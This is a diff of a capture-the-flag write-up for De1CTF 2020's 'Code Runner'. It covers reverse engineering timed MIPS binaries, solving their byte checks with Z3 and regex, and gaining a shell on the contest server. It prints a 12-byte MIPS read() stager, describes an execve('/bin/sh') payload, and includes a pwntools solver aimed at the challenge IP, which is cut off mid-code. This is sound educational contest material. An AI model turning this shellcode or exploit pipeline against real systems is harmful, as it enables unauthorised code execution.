@@ -1,53 +1,73 @@
 ---
 layout: post
-title: "[De1CTF 2020] Coderunner (11 solves)"
+title: "[De1CTF 2020] Code Runner (11 solves)"
 author: Filip Kilibarda
 ---
+
+**Heads up** This writeup is mostly focused on my thought process throughout the problem and may
+have some ranting interleaved.
 
 CODE RUNNER
 ===========
 
-Hilarious team effort to solve this in the last 6 minutes of the competition that involved Robert
-grabbing random mips shellcode off the internet and this dialouge
+This wound up being an awesome team effort to solve the challenge in the last 6 minutes of the
+competition. The last few minutes were REALLY intense and Robert got fired up while copy pasting
+random shellcode off the internet for me to run.
 
->
-    Robert: JUST RUN THIS
-    Robert: NO PAD IT WITH LOTS OF ZEROS
-    Me:     How many zeros?
-    Robert: LOTS
-    Me:     Like more than 256?
-    Robert: NO NOT THAT MANY, *pastes padded shell code into slack*, RUN THIS
-    Me:     Ok
-    ...
-    Me:     Holy crap it worked *crying*
-    Robert: WHAT?
+<pre>
+> Robert: JUST RUN THIS  
+> Robert: NO PAD IT WITH LOTS OF ZEROS  
+> Me:     How many zeros?  
+> Robert: LOTS  
+> Me:     Like more than 256?  
+> Robert: NO NOT THAT MANY
+> Robert: *pastes padded shell code into slack*
+> Robert: RUN THIS  
+> Me:     Ok  
+> ...  
+> Me:     Holy crap it worked
+> Robert: WHAT?  
+> Me:     *tears of joy*  
+</pre>
 
-<image> of the final shot
+This was an awesome problem in my opinion. It required serious consideration of both network latency
+and the wall clock runtime of your solution. It's not often that you need to consider from where in
+the world you want to run your solution...
 
-This was an awesome problem in my opinion. For several reasons. Because it required:
-    - serious considerations of network latency
-    - serious considerations for how quickly your exploit program must run
+# Wasting time with the POW
 
-When I first opened the problem, I was a bit confused by the proof of work, for some reason I
-thought it would be way too slow to try and do it in python, so I wasted some time and thought I'd
-try and get more familiar with `hashcat`. If hashcat had a setting for this kind of proof of work,
-it would do it extremely fast (with the GPU acceleration), but as it turns out trying to do this
-with `hashcat` is just overkill.
+When I first opened the problem, I was a bit confused by the proof of work, my intuition tripped me
+up and I thought it would be way too slow to try and do it in Python, so I wasted some time and
+thought I'd try and get more familiar with `hashcat`. I couldn't get `hashcat` to handle this
+specific case, and as it turns out, it was also totally overkill with its fancy GPU acceleration.
 
-In the worst case Python 3.8 can do the proof work in about 12 seconds.
+In the worst case Python 3.8 can do the POW in under 13 seconds.
 
-<%timeit image>
+![timeit](/assets/images/de1ctf2020/timeit.png)
 
-Once I finished messing around with the proof of work, it was time to look at the actual problem!
+Now onto the actual problem!
 
-After submitting the proof of work (for each new connection), the server says "Binary dump" and
-hands you a large base64 encoded blob of text.
+# First thoughts
 
-<image>
+After submitting the POW, the server sent a large base64 blob, titled "Binary Dump".
 
-And prints this title apparently showing a scoreboard, then prompts you with `Faster >`
+```
+Binary Dump:
+===============
+sH4sICHJmr14AAzIyMTQ5NjA4NjYA7Fx9cFRVlj/3dafzwYcvIUgDUV/
+sfqTXDrHBSDVOlJcPILjIRhZrYw076Xx0IBpIJgkMTllrFyADa8ZmZtg
+ardHarKCwi7VBx6mZtUR7Y0CcnXGpXWvGqp0/UuMXzqjl1OLqVlG8/Z3
+73kteXrobXNnaKYtL3bx3zrn3nHPPxz23u9/jodXr1wghyGkKFRFDRrF
+...
+7jOch9FmFfo61jfhu8BFs/n/cQ4ctyQh6Qb7wvjFsAt7pCxp8t9E60Xy
+DlxwhhzbsG4E+BOzuG+M24J3PJeuMa5H4wT6COJQx95f38yDr0luDT3x
+fsVuKvorVkH7rATD9nfjDsC7uiceH8E9Q/zHgP3NV69f/37O3Xx/E+Gy
+G0zLvJHtOp8OQVuj+24+7zo+/gL89m3P7u/Oi4+xrVOvJxPKsa1Y8y4j
+Z777T87Ir0qjEoAAA==
+```
 
-# TODO use image instead here
+Then printed a scoreboard and a prompt `Faster >`
+
 ```
 ===============
 Rank(Refresh Every Min)
@@ -66,113 +86,105 @@ ________         ____        __    _____
 Faster >
 ```
 
-And that's it, the server just waits for you to enter something. If you enter some random text, say
-`AAAA`, the server just closes the connection.
+And that was it, the server just waited for input. If I sent some random text, say `AAAA`, the
+server just closed the connection.
 
 It was pretty unclear just from that what I was supposed to do.
 
-So next step was to take a look at that base64 blob they gave us and see what it was. 
+So next step was to take a look at that base64 blob to see what it was.
 
-`b64d(blob)` returns a Gzip file, `gzip.decompress(gzip_blob)`, and that returns an ELF 32-bit MIPS
+`b64d(blob)` returned a Gzip file, and `gzip.decompress(b64d(blob))` returned an ELF 32-bit MIPS
 program!
 
-I put it in Ghidra
+In Ghidra:
 
-<image>
+![Ghidra main function](/assets/images/de1ctf2020/ghidra_main_color.png)
 
-The `main` function in Ghidra is pretty straight foward,
-    - call `gettimeofday`, save the result
-    - disable libc IO buffering
-    - call `unknown` function - get back to this later
-    - if `unknown` function returns truthy value continue execution
-    - else exit
-    - if execution continued, call `gettimeofday` again and save the result
-    - compare the old time to the new time
-    - write your time to a scoreboard
-    - if your time was fast enough, call `read` on stdin
-    - finally call the buffer that the `read` was done on
+The `main` function was pretty straight foward,
 
-So basically we know that we're being timed for how long it takes to execute `unknown` function and
-we also need `unknown` function to return truthy value.
+- call `gettimeofday`, save the result
+- disable libc IO buffering
+- call some function (highlighted blue) that needs to return non-zero
+- call `gettimeofday` again to measure time taken
+- write your time to a scoreboard
+- if your time was fast enough, call `read` on stdin
+- finally execute the bytes that were just read
 
-So the questions are
-    - what does it take for `unknown` func to return truthy
-    - how fast does it need to be, so that we get to execute arbitrary shellcode?
+Basically it timed you on how long it took to execute the function highlighted in blue and if it
+returned non-zero you got to execute whatever you wanted!
 
-Next I dug into `unknown` function.
+Seemed pretty easy so far.
 
-<image>
+So I needed to figure out
 
-- allocated 256 bytes onto the stack
-- call `read` stdin on the buffer
-- call another function with the buffer
+- how to make the blue function return non-zero
+- how quickly did it need to run
 
-Following the function call, lead me to this
+Here's the function:
 
-<image>
+![function](/assets/images/de1ctf2020/unknown_func.png)
 
-- do a bunch of checks on the first 4 bytes of the buffer
-- if the checks pass, call another function with buffer + 4
-- otherwise return 0
+It read up to 256 bytes from the user into a stack buffer then called another function with a
+pointer to the buffer.
 
-Now we can't have this function return 0, because parent function will then also return 0, which
-will mean that the part that executes arbitrary shellcode from the user will never execute.  So we
-need this to return non-zero.
+The next function:
 
-If the check passes another function is called with the `param+4`, where param is the stack buffer.
+![xor function](/assets/images/de1ctf2020/xor_func.png)
 
-<image>
+- did a bunch of checks on the first **4 bytes** of the buffer
+- if they passed, it called another function with buffer + 4
+- otherwise it returned 0
 
-And the pattern repeats, check 4 bytes and call another function, although the structure of the
-checks is a bit different.
+If this function returned 0, then the parent would've also returned 0, and subsequently, execution
+would've never reached the part where it executeed whatever I gave it. So I needed to stay away from
+the `return 0` scenario. This meant going deeper in the call chain.
+
+The next function:
+
+![and function](/assets/images/de1ctf2020/and_func.png)
+
+And the pattern repeated, it checked 4 bytes then called another function if the bytes were good,
+although the structure of the checks were a bit different.
 
 I followed these function calls about 16 levels deep until I finally got to this
 
-<image>
+![end function](/assets/images/de1ctf2020/end_func.png)
 
-which returns `0xc001babe`, a non-zero value!
+which returned `0xc001babe`, a non-zero value!
 
-So what we needed to do was send `16*4` bytes, such that they satisfy the tests in the 16 functions.
+So I needed to send `16*4` bytes, such that they satisfied the tests in the 16 functions.
 
-Ok so that's super easy, especially since the chunks of 4 bytes are independent of one another. We
-could easily run this through Angr or construct our own z3 forumla to solve this.
+So far this problem didn't look too bad, especially since the chunks of 4 bytes were independent of
+one another. I could've easily run this through Angr or constructed Z3 forumlas by hand to solve
+this.
 
-But here's the catch, on each new connection to the server, you get a **different** binary, one
-where the checks in the 16 functions are slightly different.
+But of course there was catch, on each new connection to the server, you got a **different** binary,
+one where the checks in the 16 functions were slightly different.
 
-But still, that isn't necessarily that bad, because we have Angr in our toolbelt. With angr, we can
-very easily programatically solve for the satisfying input for every new binary the server gives us.
+But still, it wasn't necessarily that bad. With angr, I could've easily solved for the satisfying
+input for every new binary the server gave me.
 
-So to recap what I knew at this point:
-    - the binary calls `gettimeofday`
-    - reads 64 bytes from the user
-    - calls the function chain
-    - if your 64 bytes satisfied the 16 functions
-        - call `gettimeofday` to measure how long it took (including time to send/recv the packets)
-        - if it was fast enough
-            - read shellcode and call it
-        - else crash
-
-So really all that was left to fully understand what was required here was to determine how quickly
-our program needs to run.
+So all that was left to fully understand this challenge, was to determine how quickly a satisfying
+solution needed to be computed.
 
 Reading Ghidra's decompiled output for the time calculations was pretty confusing to me and I didn't
 feel like trying to understand it. I figured since I'd probably need to run the program at some
 point anyway, I'd just run it and determine the time constraint emperically.
 
-At this point I had saved a few of the binaries the server had given me, and was reusing the same
-ones for testing (rather than connecting to the server each time and getting a new binary).
+At this point I had saved a few of the binaries the server had given me and was reusing them for
+testing.
 
-In order to get to the part of the program where the time calculations happen, I needed to have
-a satisfying set of 64 bytes to feed it. Here I thought of a couple options:
-    - run the program under Angr and have Angr tell me the solution
-    - patch the binary to call `sleep` instead of executing the 16 functions
-        - then I could mess with how long it sleeps for
+In order to get to the part of the program where the time calculations happened, I needed to have a
+satisfying set of 64 bytes to feed it. Here I thought of a couple options:
 
-Because I don't know much about mips, in particular syscall numbers, compilers, etc. and didn't feel
-like spending any time figuring it out, I just used Angr, which I was already quite familiar with.
+- run the program under Angr and have it solve for the solution
+- patch the binary to call `sleep(x)` instead of executing the 16 functions
 
-I deleted the original code so here this untested replica.
+Because I didn't know much about MIPS, in particular syscall numbers, compilers, etc. and didn't
+feel like spending any time figuring it out, I just used Angr, which I was already quite familiar
+with.
+
+Here's roughly what I had --- *I deleted the original :(*
 
 ```python
 p = angr.Project("./code.0")
@@ -193,12 +205,13 @@ CTF a bit late, and started working on this question about 20 hours into the com
 point the problem only had 4 solves, so I knew this was going to be really hard, but nevertheless, I
 was shocked that it was even possible.
 
-*Note, in order to run it I needed to get a functional qemu-mips setup for dynamically linked
-binaries, [notes on that here](link)*
+<center><h2>1.1 seconds</h2></center>
 
-It turns out that you had roughly under 1.1 seconds.
+That Angr script I mentioned above, that took somewhere between 
 
-To understand how crazy that is, we need look at it a bit deeper.
+<center><h2>10-20 seconds</h2></center>
+
+To understand this madness, we need look at it a bit deeper.
 
 After the server receives your proof of work and verifies that it's correct, it `base64(gzip())`s
 the binary, then writes the data to its TCP socket connected to you. Since `write` or `send` to a
@@ -209,31 +222,31 @@ stdin/stdout to the socket. Now the binary is executing --- it calls `gettimeofd
 for the 64 bytes. At this point you **haven't even received** the binary yet and the clock is
 already ticking.
 
-So how much of your precious 1.1 seconds are you losing just to network latency?
+So how much of the precious 1.1 seconds was I losing just to network latency?
 
-`ping` from my place in Vancouver, BC, Canada is about 390ms average and 250ms minimum.
+`ping` from my place in Vancouver, BC, Canada was about 390ms average and 250ms minimum.
 
-So in **best case** it take 250ms to receive the binary, then takes another 250ms for the server
-to receive my 64 bytes. So the best scenario is 500ms just for network communication. That leaves me
-with 600ms for everything else.
+So in **best case** it would've taken 250ms to receive the binary, then another 250ms for the server
+to receive my 64 bytes. So the best scenario was 500ms just for network communication. That left
+just 
 
-Now that Angr script I mentioned above, that took somewhere between 10-20 seconds to compute the 64
-byte solution. So the prospect of running in under 600ms is quite low.
+<center><h2>600 ms</h2></center>
 
-I should mention... one of the thoughts that came to mind here was, well, where is the server?
+But that was assuming that I connected from Vancouver...
 
-I googled "ping test location" or something and it lead to some website that pings a target IP from
-several locations around the world and gives you the time for each ping. Turned out that the server
-was in Tokyo, so I spun up a AWS instance in the Tokyo region and found that I could get ping
-replies in 60ms average with low variance. So that brings down the network latency issue to around
-120ms, much better.
+I googled "ping test location" or something like that and it lead to a website that pinged a target
+IP from several locations around the world and returned the time for each ping. Turned out that the
+server was in Tokyo, so I spun up an AWS instance in the Tokyo region and found that I could get
+ping replies in 60ms average with low variance. So that brought down the network latency issue to
+around 120ms, much better.
 
-That means I had about 1 second to compute a 64 byte solution. # MINUS THE TIME IT TAKES FOR THE
-BINARY ACTUALLY EXECUTE
+That meant I had under 1 second to compute a 64 byte solution, *not including the time it took to
+actually run the code between the two `gettimeofday` calls --- which was suprisingly high on my
+machine with qemu-mips*.
 
-Here's where I sat and thought for a while....
+Here I sat and thought for a while...
 
-Angr clearly isn't going to work for us in the *usual* way that it's used. But maybe I could dig
+Angr clearly wasn't going to work in the *usual* way that it's used. But maybe I could dig
 down into some of the lower level components and figure out how to use only the bits that are
 important for our problem? Maybe by stripping out extra bulk I could make it faster?
 
@@ -250,139 +263,143 @@ So I had to come up with some other way. This lead me back to analyzing the bina
 server.
 
 I took a close look at the 16 functions, and noticed that some of them had exactly the same
-structure, just some of the constants and comparison directions were changed. In fact, there were
-only 5 different types of functions.
+structure, just some of the constants and comparison directions were different.
 
 For example:
 
-# TODO DISCUSS A COUPLE IMAGES
+![a](/assets/images/de1ctf2020/add_func_0_hi.png) 
+![b](/assets/images/de1ctf2020/add_func_1_hi.png)
 
-This is where it was helpful to speculate about how the server might have been generating these
-binaries. I figured it was probably using some template C source code, substituting in random
-constants (*random while still being satisfiable*), compiling it, then sending it over.
+This is where it was helpful to speculate how the server might have been generating these binaries.
+I figured it was probably using some template C source code, substituting in random choices for
+template variables (*random while still being satisfiable*), compiling it, then sending it over.
 
-And this is where I realized that I could potentially write a super specialized little tiny version
-of Angr just for this problem.
+<h3>There were only 5 function templates that the problem authors used.</h3>
 
-All I needed to do was extract the important constants, identify the function templates (of the 5
-templates), then substitute the constants into a z3 expression for the corresponding function
-template. Then get Z3 to solve the constraints.
+So all I needed to do was identify which of the 5 templates each function corresponded to, extract
+the template "variables" from the functions, and substitute the variables into a Z3 expression for
+the corresponding template. Then get Z3 to solve the constraints.
 
-So that was the plan. I got in touch with Robert to get some affirmation that this plan actually
-made sense. He helped me break down some of the differences between the functions even further.  He
-mentioned that he has solved some challenges like this with regex, although not under such time
+Basically I needed to write 5 Z3 reimplentations of the function templates that took the template
+variables as arguments.
+
+So that was the plan. I got in touch with Robert to get some affirmation that this actually made
+sense. He helped me break down some of the differences between the functions even further. He
+mentioned that he had solved some challenges like this with regex, although not under such time
 constraints.
 
-That brings up an interesting point, maybe we can disassemble the code, the simply just regex the
-disassembly to extract all the useful bits. I ended up using regex for matching against individual
-disassembled instruction, but maybe I could've regexed across entire functions? Maybe that would've
-been simpler.
+<h3>Regex</h3>
 
-There's a common pattern in problems like this, where we're trying to implement as fast as possible,
-with as few bugs along the way as possible, we don't really care about maintainability/readability
-of the code, but can be helpful as it grows. We can always come up with a nice clean solution that's
-well engineered and tested, but that takes time and in a competition we really just want it done as
-fast as possible. The trick to implementing quickly in problems like this, I believe, really comes
-down to how well you identify the common patterns and simplicities in the problem.
+Regex was a powerful tool for this part. I definitely didn't use it to it's full potential,
+nevertheless, I used it to identify function boundaries and for extracting the template variables
+from the functions.
 
-For example, we could spend a bunch of time writing code that can parse out all the functions from
-the program and create nice `Function` objects, which some attributes, like number of instructions,
-offset in the file, number of basic blocks, etc. This metadata would all be very useful, especially
-if we were doing real software engineering and needed our components to be reusable elsewhere. But
-this is not software engineering, this is racing (something that I'm not very good at). I actually
-have to try really hard to deviate away from the over engineering.
+# Only the Bare minimum
 
-To continue the example and relate back to the point of finding the simplicities in the problem: if
-we really look at the binary and decompiled code, you'll notice that the 16 functions are always
-adjacent in the file. 
+*ranting*...
 
-You'll also notice that each function has a deterministic structure. It starts with a simple
-function prelude that saves the return address, and ends with a `jr` return instruction. The return
-instruction is always exactly right before the start of the next function's prelude in the binary
-file. This may seem obvious, but compilers don't always put the return instructions at the latest
-offset in the file. Sometimes the return is placed near the function prelude, then there's jump
-statement away from it, then other sections of the funciton will jump back to an earlier offset in
-the function.
+There's a common pattern in problems like this, where you're trying to code as fast as possible,
+with minimal bugs along the way.
 
-Another note is that the functions are ordered in the binary file by the reverse order in which they
-are called. This is also a hilariously helpful property that will make our binary parser so much
-simpler.
+- we don't really care about maintainability/readability, but can be helpful as the code grows
+- we want to avoid over engineering, primarily because it takes longer
+- we don't want to under-engineer either, then suffer while debugging
 
-So all we need to do is find the offset where the deepest function in the call chain is stored in
-the binary, then consume instructions forward, stopping whenever we hit a `jr` return instruction to
-record the end of a function, and so on. We just need to consume 16 functions worth of instrucitons,
-and we've got every function, in order.
+I think the trick to quickly implementing solutions for problems like this comes down to how well
+you identify the common patterns and simplicities in the problem.
 
-Now to identify the function templates. Once again, you can design some really nice solution that
-identifies templates based on number of basic blocks, number of instructions, length of the basic
-blocks, etc. or you can look for some super simple metric that will **work most** of the time.
+If you fail to find the "simple" solution, or the common patterns, then you end up writing code for
+a more general case that's not actually important for the immediate problem at hand.
 
-I noticed that the function types had disjoint numbers of instructions. So that's it. All I had to
-do was define a size range for each type of function, and match on that. Sometimes functions in the
-same type would vary in size because of slight differences in how they were compiled. Even then the
-sizes were still disjoint.
+I am by no means great at identifying the simple solutions. I often default to implementing the more
+general case, subsequently taking longer. But it's something I'm aware of and actively try to work
+on.
 
-Once I had the function types, I then needed to parse out the constants. Each function type had the
-same number of constants that needed to be extracted. So basically for each type I needed to specify
-how many constants there were, then pass that to a general purpose function for extracting them.
+# Finding the patterns
 
-For example, in this function, the indices into the buffer, and the constant values in the
-comparisons, are what need to be extracted.
+With Robert's help we found several patterns in the binaries that drastically simplified the
+solution in the end.
 
-<image>
+The 16 functions were always adjacent in the file
+
+The functions were ordered in the reverse order in which they were called.
+
+Each function had a deterministic structure. It started with a simple function prelude that saved
+the return address, and ended with a `jr` return instruction. The return instruction always appeared
+exactly right before the start of the next function's prelude. *Compilers don't always do this*.
+
+This made identifying function boundaries very easy.
+
+Their compiler was being very kind here... optimizations were probably off :)
+
+So all I needed to do was find the offset where the deepest function in the call chain was stored,
+then consume instructions forward, stopping at every `jr` return instruction to record the end of a
+function, and so on, stopping after consuming 16 functions.
+
+## Identifying function templates
+
+I noticed that functions from a particular template were always roughly the same size (within ~20
+bytes).
+
+I also noticed that the size ranges for the templates were disjoint.
+
+So that's it. All I had to do was define a size range for each template, and match functions against
+the size range.
+
+## Parsing out the template variables
+
+*Note: I used Capstone to disassemble the code. This made regex matching easier.*
+
+Once the functions were identified, I then needed to parse out the template variables.
+
+For example, here I needed to extract the buffer indices, and the constant values in the
+comparisons:
+
+![analyze instructions](/assets/images/de1ctf2020/analyze_instructions_decompiled.png) 
+![analyze instructions](/assets/images/de1ctf2020/analyze_instructions.png) 
 
 Robert pointed out that the compiler was really kind to us here and used completely predictable
 instrucitons for loading bytes from the stack buffer and for loading constants into registers. The
-order in which these operations happened was also always exactly the same for each binary. Basically
-the compiler was being really kind to us; the problem authors most likely turned off all
-optimizations.
+order in which these operations happened was also always exactly the same for each binary. Once
+again, the problem authors probably turned off compiler optimizations.
 
-So basically what I needed to do was: for each function, identify the type, for each instruction in
-function, if instruction matched one of the patterns, extract the value, continue until end of
-function.
-
-Now I just needed to use the extracted values to solve for a satisfying solution. This is where z3
-came in. There were only 5 types of functions, so I wrote 5 z3 reimplementations of each type of
-function, that took on the values that we extracted from the binary as arguments.
-
-Here's the z3 reimplementation of this type
-
-<image>
+For example, this regex could extract all the buffer indices:
 
 ```python
-def or_func(params, *args):
-    conds = []
-    s = Solver()
-    p = [BitVec(f"p{i}", 8) for i in range(4)]
-
-    for _ in range(3):
-        idxs, consts = next(params)
-        conds.append( p[next(idxs)] + p[next(idxs)] == next(consts) )
-
-    s.add(Not(Or(*conds)))
-    s.check()
-    m = s.model()
-    return bytes([m.eval(pp).as_long() for pp in p])
+idx_pattern = re.compile(
+        r"lw ..., 0x20\(\$fp\);"
+         "(?:addiu ..., ..., ([1234]);)?"
+         "lbu ..., \(...\)")
 ```
 
-I create 4 symbolic bytes, then just copy what the code does. I.e., add two bytes and compare to a
+In summary, I just needed to identify the template for each function then extract the template
+variables with regex.
+
+# Solving the constraints
+
+Now I just needed to use the extracted values to solve for a satisfying solution. There were only 5
+function templates, so I wrote a Z3 re-implementation for each one that took the extracted template
+variables as arguments.
+
+Here's one of them
+
+```python
+z3_expr = And(
+    np() ^ np() == nc(),
+    np() == nc(),
+    np() == ( ( ( np() ^ np() ) & 0x7f ) << 1 ),
+    np() == ( np() ^ np() ^ np() )
+)
+```
+
+where `np()` and `nc()` fetch the next buffer byte and next constant.
+
+![or function](/assets/images/de1ctf2020/or_func.png) 
+
+I created 4 symbolic bytes, then just copied what the code did. I.e., add two bytes and compare to a
 constant.
 
-In the end I had about 600 lines of python to solve this part of the challenge and was huge pain to
-debug. I definitely over-engineered some parts of it as usual, the code could've been a lot DRYer,
-but writing DRY code often takes much longer and restricts the program's flexibility, so I'm not too
-hard on myself for that.
-
-One of the mistakes I made was not casting my z3 `BitVec`s up to 32 bits prior to doing
-multiplication between them (as you can see in the decompiled output). 
-
-<image>
-
-So I was overflowing unknowingly and z3 was giving solutions that didn't work against the binary.
-
-Here's where I fixed it:
-
-<image>
+# Testing
 
 I tested my solver locally using these two wonderful qemu commands
 
@@ -392,37 +409,39 @@ qemu-mipsel -g 5000 ./code   # gdb
 ```
 
 My solution ran in about 400ms (just to compute the solution, nothing else). This was much faster
-than it needed to be, but with the network latency between Japan and Canada, it actually didn't work
-*most* of the time when connecting to the server from my machine.
+than it needed to be, but with the network latency between Tokyo and Vancouver, it actually didn't
+work *most* of the time when connecting to the server from Vancouver.
 
 At this point there was only 1 hour left, I wanted to get a setup running on an AWS instance in
-Japan so it could run more consistently, and I also needed some mips shellcode. I hit up Daniel and
+Japan so it could run more consistently, and I also needed some MIPS shellcode. I hit up Daniel and
 Robert to help me get some shellcode running while I got the server set up.
 
-A funny trick they put in the binary is that the faster your code runs, the more shellcode you get
-to write.
+A funny trick they put in the binary was that the faster it ran, the more shellcode you got to
+write.
 
-1.3s you get 4 bytes of code, 1 mips instruction
-1.0s : 16 bytes
-0.8s : 24 bytes
-0.6s : 32 bytes
+Time | -- Bytes of shellcode
+--- | :---:
+1.3s | 4
+1.0s | 16
+0.8s | 24
+0.6s | 32
 
-I was rushing and wasn't really sure how fast it was going to run on the AWS instance in Japan while
-Robert was developing the shellcode, so we didn't make any drastic assumptions about how much
-shellcode we were going to get. Robert assumed at the very least, we would have 12 bytes, which was
-definitely true given the run time I observered. So he designed some code that calls `read` to read
-in even more shellcode :), then we would send many more bytes to complete it.
+I was rushing and wasn't really sure how fast it was going to run on the AWS instance, so Robert
+made no assumptions about how much shellcode we were going to get. He assumed at the very least, we
+would have 12 bytes. So he designed some code that calls `read` to read in even more shellcode, then
+we would send a full `execve("/bin/sh", NULL, NULL)` payload on the second read.
 
-The trick here was that the binary calls `read` immediately before calling the buffer, 
+The trick to calling `read` with only 12 bytes (3 MIPS instructions), was to notice that the binary
+immidiately executed your shellcode after calling `read`.
 
-<image>
+![call shellcode](/assets/images/de1ctf2020/call_shellcode.png) 
 
-this meant that the argument registers from the `read` call were left unchanged when calling your
-shellcode, i.e., `a0` was still be zero (stdin) and `a1` was still the stack buffer. All we wanted
-to change, was the number of bytes to read.
+This meant that the argument registers from the `read` call were left unchanged when calling your
+shellcode, i.e., `a0` was still 0 (stdin) and `a1` was still the stack buffer. All we wanted to
+change, was the number of bytes to read.
 
-So basically the 12 byte shellcode just needed to set `a2 = 0xff` and set `v0` (the syscall
-register) to `SYS_READ` and execute `syscall` :)
+So basically the 12 byte shellcode just needed to set `a2 = 0xff`, set `v0` (the syscall register)
+to `SYS_READ` and execute `syscall` :)
 
 ```
 addi    a2, zero, 256
@@ -430,7 +449,7 @@ li      v0, 4003
 syscall
 ```
 
-Robert confirmed that the 12 byte `read` code definitely worked, and all we needed was some mips
+Robert confirmed that the 12 byte `read` code definitely worked, and all we needed was some MIPS
 code that called `execve("/bin/sh", NULL, NULL)`. He tried using pwntools `asm(shellcraft.sh())` and
 it didn't work for some reason.
 
@@ -438,43 +457,318 @@ At this point there were 6 minutes left.
 
 I had the AWS instance all set up, I had connected to the server, solved the constraints, sent the
 64 bytes, sent the 12 byte read shellcode, and had called `IPython.embed()`, so I just had a Python
-prompt infront of me and didn't actually know if the 12 byte `read` code worked and whether the
+prompt infront of me and didn't actually know if the 12 byte `read` code worked or whether the
 connection was still open.
 
-<image> of just an ipython prompt
-
-My next step was to give `asm(shellcraft.sh())` a shot myself, in case Robert forgot to set the
+My next step was to give `asm(shellcraft.sh())` a try myself, in case Robert forgot to set the
 architecture `context.arch = "mips"`.
 
-Meanwhile Robert was literally pulling random mips shellcode off the internet and sending it to me.
+Meanwhile Robert was pulling random MIPS shellcode off the internet and sending it to me.
 
 He pasted some space separated hex shellcode into Slack and said "RUN THIS".
 
-I pasted it into my Python prompt and hoped that `bytes.fromhex` could handle space separated hex.
+I pasted it into my Python prompt, not bothering to cut out the spaces, hoping that `bytes.fromhex`
+could handle it.
 
-Here's what the final moments of this problem looked like on my screen.
+![paste shellcode](/assets/images/de1ctf2020/paste_shellcode.png) 
 
-<image>
+And it worked!
 
-And it worked, I don't think either Robert or I ever disassembled this code to see what it was,
-anyway, it got us flag, so thanks random internet shellcode.
+![flag](/assets/images/de1ctf2020/flag.png) 
+
+Thanks random internet shellcode!
+
+Turns out `asm(shellcraft.sh())` execs this
+
+![shellcraft](/assets/images/de1ctf2020/shellcraft_fail.png)
+
+nice
+
+
+
+
+# Mistakes
+
+In the end I had about 600 lines of Python to solve this challenge and it took a while to debug. I
+definitely over-engineered some parts of it and the code could've been a lot DRYer.
+
+One of the mistakes I made was not casting my Z3 `BitVec`s up to 32 bits prior to doing
+multiplication between them (as you can see in the decompiled output). 
+
+![uint cast](/assets/images/de1ctf2020/multiply.png) 
+
+So I was overflowing unknowingly and Z3 was giving solutions that didn't work against the binary.
+
+Here's where I fixed it:
+
+![zero extend](/assets/images/de1ctf2020/zero_ext.png) 
+
+I definitely didn't make enough use of regex. This was my code to pull out some template variables.
+
+```python
+def addiu_idx(inst):
+    #   (68, 4, 'addiu', '$v0, $v0, 2'),
+    name = inst[2]
+    ops  = inst[3]
+    assert name == "addiu"
+    m = re.search(r"\$v[01], \$v[01], ([123])", ops)
+    assert m
+    return int(m.group(1))
+
+def next_addiu_or_zero(block_iter):
+    found_lw = False
+    count_since_lw = 0
+    for inst in block_iter:
+        name = inst[2]
+        ops  = inst[3]
+        if found_lw is False and name == "lw":
+            found_lw = True
+            count_since_lw += 1
+            continue
+        if found_lw:
+            if name == "lbu":
+                return 0
+            elif name == "addiu" and re.search("\$v[01], \$v[01],", ops):
+                return addiu_idx(inst)
+    assert 0
+```
+
+I used regex only for matching on single instructions, and the rest was kind of state machine like.
+
+I think this code could've been written much faster and been much quicker to debug if I just wrote
+some quick and ugly regex matching across whole functions.
+
+
+
 
 # Setting up qemu-mips
+
+*Note, in order to run it I needed to get a functional qemu-mips setup for dynamically linked
+binaries, [notes on that here](link)*
 
 This meant I needed a working qemu-mips setup, something I had once
 set up on another machine, but didn't have on my current VM.
 
-To get a functional mips set up I had to install a few things, make some symlinks and the magic of
+To get a functional MIPS set up I had to install a few things, make some symlinks and the magic of
 qemu and binfmt covered everything else.
 
-I usually use [Zach Riggle's Stackexchange answer](link) (author of pwntools) for reference when
-doing anything QEMU related.
+I usually use [Zach Riggle's Stackexchange
+answer](https://reverseengineering.stackexchange.com/a/8917/28379) (author of pwntools) for
+reference when doing anything QEMU related.
 
 Short summary:
-    - install libc compiled for mips little endian `apt install libc6-mipsel-cross`
-    - install qemu-mips
-    - set up symlink for `binfmt` to find libc from mips programs `ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel`
 
-And now we can run the program with just `./code`, we don't even need `qemu-mipsel` infront.
+- install libc compiled for MIPS little endian and qemu
+  ```
+  apt install qemu qemu-user qemu-user-static
+  apt install libc6-mipsel-cross
+  ```
+- set up symlink for `binfmt` to find libc for MIPS programs 
+  ```
+  ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
+  ```
+
+And now MIPS programs can be run with just `./code`, no need to prefix with `qemu-mipsel`.
+
+
+
+
+# Code
+
+The solution I built for the contest was about 600 lines of Python and way too over-engineered.
+Here's a rewrite where I tackled some of the mistakes that slowed me down.
+
+By making little helper functions and leaning heavily into regex, this implementation went much
+faster.
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+from capstone import *
+from IPython import embed
+from ipdb import set_trace
+from z3 import BitVec, BitVecVal, And, Or, Xor, If, Solver, Not, ZeroExt, Extract
+
+import re
+import gzip
+import time
+import itertools
+from hashlib import sha256
+
+
+context.arch = "mips"
+md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32)
+end_func_bytes = bytes.fromhex("f8ffbd270400beaf25f0a0030800c4af01c0023cbeba423425e8c0030400be8f0800bd270800e00300000000")
+r = None
+
+def get_binary():
+    global r
+    r = remote("106.53.114.216", 9999)
+
+    r.recvuntil("hexdigest() == ")
+    hexhash = r.recvline().strip(b"\n\"").decode("ascii")
+
+    for s in [bytes(x) for x in itertools.permutations(range(0, 256), 3)]:
+        if sha256(s).hexdigest() == hexhash:
+            break
+    else:
+        assert 0
+
+    r.sendline(s)
+
+    r.recvuntil("Binary Dump:\n")
+    r.recvuntil("======\n")
+    hexcode = r.recvline().strip(b"\n")
+
+    gzipcode = b64d(hexcode)
+
+    code = gzip.decompress(gzipcode)
+
+    return code
+
+
+def test_range(func, r):
+    return r[0] <= len(func)*4 <= r[1]
+
+
+def extract_template_vars(func):
+    insts = ";".join([f"{inst[2]} {inst[3]}" for inst in func])
+    idx_pattern = re.compile(
+            r"lw ..., 0x20\(\$fp\);"
+             "(?:addiu ..., ..., ([1234]);)?"
+             "lbu ..., \(...\)")
+    idxs = [int(i or "0") for i in idx_pattern.findall(insts)]
+    const_pattern = re.compile(r"addiu \$v\d, \$zero, (0x)?(.+?);")
+    consts = [int(n, 16 if base16 else 10) for base16, n in const_pattern.findall(insts)]
+    cmp_pattern = re.compile(
